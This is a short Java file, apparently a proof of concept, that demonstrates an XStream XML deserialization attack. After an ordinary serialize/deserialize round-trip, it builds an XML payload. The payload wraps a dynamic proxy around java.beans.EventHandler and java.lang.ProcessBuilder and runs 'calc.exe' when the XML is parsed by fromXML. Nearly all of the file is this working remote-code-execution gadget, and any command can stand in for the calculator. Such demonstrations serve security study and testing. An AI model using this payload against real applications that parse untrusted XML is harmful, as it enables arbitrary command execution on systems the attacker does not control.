import java.io.File;
import java.io.IOException;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import contact.Contact;
import contact.ContactImpl;

public class Main {
  public static void main(String[] args) throws IOException {
    XStream xstream = new XStream(new DomDriver());
    ContactImpl contact = new ContactImpl();
    String contactXml = xstream.toXML(contact);
    ContactImpl contactFromXml = (ContactImpl) xstream.fromXML(contactXml);

    String xml = "<contact.Contact>\n"
    + "<dynamic-proxy>\n" 
      + "<interface>contact.Contact</interface>"
        + "<handler class='java.beans.EventHandler'>"
          + "<target class='java.lang.ProcessBuilder'>"
            + "<command><string>calc.exe</string></command>" 
          + "</target>"
          + "<action>start</action>" 
        + "</handler>" 
      + "</dynamic-proxy>" 
    + "</contact.Contact>";

    String contactXmlNew = xstream.toXML(new ContactImpl());
    System.out.println(contactXmlNew);
    Contact c = (Contact)xstream.fromXML(xml);
    // System.out.println(c.getFullname());
  }
}